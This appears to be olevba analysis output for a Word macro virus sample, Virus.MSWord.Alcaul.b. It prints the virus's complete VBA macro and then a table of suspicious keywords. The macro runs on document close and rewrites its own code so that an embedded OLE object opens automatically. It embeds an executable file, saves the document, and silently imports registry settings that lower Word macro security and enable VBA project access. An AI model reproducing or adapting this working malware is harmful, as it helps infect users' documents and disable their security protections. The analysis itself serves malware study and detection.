olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Alcaul.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Alcaul.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub document_close()
On Error Resume Next
Open "c:\xploit.txt" For Output As 2
Print #2, "sub document_open()"
Print #2, "On Error Resume Next"
Print #2, "'by alcopaul"
Print #2, "obj = ActiveDocument.Shapes(1).OLEFormat.ClassType"
Print #2, "With ActiveDocument.Shapes(1).OLEFormat"
Print #2, "    .ActivateAs ClassType:=obj"
Print #2, "    .Activate"
Print #2, "End With"
Print #2, "end sub"
Close 2
Set fso = CreateObject("Scripting.FileSystemObject")
Set nt = ActiveDocument.VBProject.vbcomponents(1).codemodule
Set iw = fso.OpenTextFile("c:\xploit.txt", 1, True)
nt.DeleteLines 1, nt.CountOfLines
i = 1
Do While iw.atendofstream <> True
b = iw.readline
nt.InsertLines i, b
i = i + 1
Loop
ActiveDocument.Shapes.AddOLEObject _
FileName:="c:\click2X.com", _
LinkToFile:=False
ActiveDocument.Save
Open "c:\vv.reg" For Output As 3
Print #3, "REGEDIT4"
Print #3, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
Print #3, """Level""=dword:00000001"
Print #3, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]"
Print #3, """Level""=dword:00000001"
Print #3, """AccessVBOM""=dword:00000001"
Close 3
Shell "regedit /s c:\vv.reg", vbHide
Kill "c:\vv.reg"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |vv.reg              |Executable file name                         |
+----------+--------------------+---------------------------------------------+

